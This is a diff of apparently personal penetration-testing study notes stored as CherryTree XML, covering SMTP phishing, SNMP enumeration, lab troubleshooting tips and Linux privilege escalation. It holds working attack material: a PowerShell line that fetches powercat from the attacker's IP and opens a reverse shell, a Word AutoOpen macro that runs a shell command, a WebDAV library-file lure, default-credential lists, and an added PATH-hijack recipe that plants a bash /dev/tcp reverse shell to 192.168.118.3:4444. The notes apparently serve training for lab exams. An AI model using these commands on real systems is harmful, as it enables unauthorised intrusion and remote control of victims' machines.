@@ -219,8 +219,13 @@ More on that here: </rich_text>
             <rich_text link="webs https://book.hacktricks.xyz/pentesting-web/file-upload">https://book.hacktricks.xyz/pentesting-web/file-upload</rich_text>
           </node>
         </node>
-        <node name="SMTP" unique_id="108" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="32" is_bold="0" foreground="" ts_creation="1688922291" ts_lastsave="1689500906">
-          <rich_text>- Check the version, some exim versions might be VULNERABLE.
+        <node name="SMTP" unique_id="108" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="32" is_bold="0" foreground="" ts_creation="1688922291" ts_lastsave="1689882594">
+          <rich_text>Before searching, it might be useful to update our MIB:
+</rich_text>
+          <rich_text justification="left"></rich_text>
+          <rich_text>
+
+- Check the version, some exim versions might be VULNERABLE.
 - Check for </rich_text>
           <rich_text weight="heavy">username enumeration</rich_text>
           <rich_text>
@@ -267,7 +272,9 @@ Example:
           <rich_text style="italic">-ap</rich_text>
           <rich_text> is for providing auth passwords
 </rich_text>
-          <codebox char_offset="215" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+          <codebox char_offset="56" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">sudo download-mibs
+# This will use /etc/snmp-mibs-downloader to download files from those config files.</codebox>
+          <codebox char_offset="274" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
 &lt;libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library"&gt;
 &lt;name&gt;@windows.storage.dll,-34582&lt;/name&gt;
 &lt;version&gt;6&lt;/version&gt;
@@ -286,10 +293,10 @@ Example:
 &lt;/searchConnectorDescription&gt;
 &lt;/searchConnectorDescriptionList&gt;
 &lt;/libraryDescription&gt;</codebox>
-          <codebox char_offset="268" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/</codebox>
-          <codebox char_offset="435" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://{our IP}:8000/powercat.ps1');
+          <codebox char_offset="327" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/</codebox>
+          <codebox char_offset="494" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://{our IP}:8000/powercat.ps1');
 powercat -c {our IP} -p 4444 -e powershell"</codebox>
-          <codebox char_offset="475" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Sub AutoOpen()
+          <codebox char_offset="534" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Sub AutoOpen()
     MyMacro
 End Sub
 
@@ -310,7 +317,7 @@ Sub MyMacro()
 
     CreateObject("Wscript.Shell").Run Str
 End Sub</codebox>
-          <codebox char_offset="650" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">swaks -t {to email} --from {from email} --attach {local file to attach} --server {IP of SMTP server} --body {txt file with body contents}
+          <codebox char_offset="709" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">swaks -t {to email} --from {from email} --attach {local file to attach} --server {IP of SMTP server} --body {txt file with body contents}
 --header "Subject: Example" --suppress-data -ap</codebox>
         </node>
         <node name="MSSQL" unique_id="112" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="32" is_bold="0" foreground="" ts_creation="1689500078" ts_lastsave="1689507889">
@@ -370,7 +377,7 @@ Also check this out: </rich_text>
           <codebox char_offset="115" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">snmpwalk -v 1 -c {community string} {IP} NET-SNMP-EXTEND-MIB::nsExtendOutputFull</codebox>
         </node>
       </node>
-      <node name="STUCK?" unique_id="77" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="19" is_bold="0" foreground="" ts_creation="1569563263" ts_lastsave="1689708818">
+      <node name="STUCK?" unique_id="77" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="19" is_bold="0" foreground="" ts_creation="1569563263" ts_lastsave="1689882744">
         <rich_text weight="heavy">Things to consider</rich_text>
         <rich_text>
 - Have you confirmed the service on the port manually and googled all the things (the SSH string, the banner text, the source)?
@@ -398,14 +405,52 @@ Also check this out: </rich_text>
         <rich_text weight="heavy">powershell not recongnized</rich_text>
         <rich_text> =&gt; </rich_text>
         <rich_text weight="heavy">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</rich_text>
+        <rich_text>
+
+----------------------- FROM </rich_text>
+        <rich_text link="webs https://dev.to/hackin7/proving-grounds-tips-50ae">https://dev.to/hackin7/proving-grounds-tips-50ae</rich_text>
+        <rich_text>
+- The firewall of the machines may be configured to prevent reverse shell connections to most ports except the application ports =&gt; Use application port on your attacking machine for reverse shell
+- </rich_text>
+        <rich_text weight="heavy">admin:admin</rich_text>
+        <rich_text>, </rich_text>
+        <rich_text weight="heavy">admin:password</rich_text>
+        <rich_text>, </rich_text>
+        <rich_text weight="heavy">guest:guest</rich_text>
+        <rich_text>, </rich_text>
+        <rich_text weight="heavy">backup:backup</rich_text>
+        <rich_text>, </rich_text>
+        <rich_text weight="heavy">&lt;username&gt;:&lt;username&gt;</rich_text>
+        <rich_text>, </rich_text>
+        <rich_text style="italic">default credentials</rich_text>
+        <rich_text>, </rich_text>
+        <rich_text style="italic">reused credentials</rich_text>
+        <rich_text>
+- Google exploits, not just </rich_text>
+        <rich_text style="italic">searchsploit</rich_text>
+        <rich_text>. Found many exploits this way
+- If the </rich_text>
+        <rich_text weight="heavy">ftp</rich_text>
+        <rich_text> command doesn't work, try </rich_text>
+        <rich_text style="italic">passive</rich_text>
+        <rich_text> </rich_text>
+        <rich_text style="italic">mode</rich_text>
+        <rich_text>, or </rich_text>
+        <rich_text weight="heavy">pftp</rich_text>
+        <rich_text>. Same thing for vice versa</rich_text>
       </node>
     </node>
     <node name="PRIVILEGE ESCALATION" unique_id="107" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="22" is_bold="0" foreground="" ts_creation="1688917213" ts_lastsave="1689415044">
       <rich_text>We have to pay attention to </rich_text>
       <rich_text weight="heavy">files on the machine</rich_text>
       <rich_text>, most of the time, this is how privilege escalation is done.</rich_text>
-      <node name="Linux" unique_id="109" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="5" is_bold="0" foreground="" ts_creation="1688924277" ts_lastsave="1689416091">
-        <rich_text>Use:
+      <node name="Linux" unique_id="109" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="5" is_bold="0" foreground="" ts_creation="1688924277" ts_lastsave="1689886443">
+        <rich_text>!Check if we are in a container:
+</rich_text>
+        <rich_text justification="left"></rich_text>
+        <rich_text>
+
+Use:
 - linpeas
 - kernel exploit suggester
 
@@ -440,6 +485,9 @@ Check files manually:
 
 Manually check:
 - SUID
+If a strange binary is found as SUID, check it's system calls:
+
+
 - SGID
 - Cronjobs (</rich_text>
         <rich_text style="italic">crontab -l</rich_text>
@@ -453,9 +501,25 @@ Manually check:
         <rich_text>
 - Check processes with </rich_text>
         <rich_text style="italic">ps aux</rich_text>
-        <codebox char_offset="66" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">uname -a</codebox>
-        <codebox char_offset="321" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">find / -perm -04000 2&gt;/dev/null</codebox>
-        <codebox char_offset="620" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">grep "CRON" /var/log/syslog</codebox>
+        <rich_text>
+
+Check capabilities:
+</rich_text>
+        <codebox char_offset="33" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">hostname
+# If we get gibberish data like "f8e1a236869d", we are in a container and we should escape it =&gt; see services that are on the machine and we could exploit
+# (other services maybe be run by machine itself, not container, and we could gather info about those services from inside the container, to gain RCE
+# of them from outside)</codebox>
+        <codebox char_offset="102" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">uname -a</codebox>
+        <codebox char_offset="357" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">find / -perm -04000 2&gt;/dev/null</codebox>
+        <codebox char_offset="662" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">ltrace {binary} # This will load the executable and print every system call
+# If any systemcall is not with absolute path, we can inject into path:
+export PATH=/tmp:$PATH
+# and add to that path a reverse shell with the name of that binary system call without absolute path
+echo 'bash -c "bash -i &gt;&amp; /dev/tcp/192.168.118.3/4444 0&gt;&amp;1"' &gt; /tmp/{binary}
+chmod +x /tmp/{binary}</codebox>
+        <codebox char_offset="722" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">grep "CRON" /var/log/syslog</codebox>
+        <codebox char_offset="822" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">getcap -r / 2&gt;/dev/null
+# And search for everyone</codebox>
       </node>
       <node name="Windows" unique_id="110" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="5" is_bold="0" foreground="" ts_creation="1688924320" ts_lastsave="1689504810">
         <rich_text>Use (and read CAREFULLY the output):
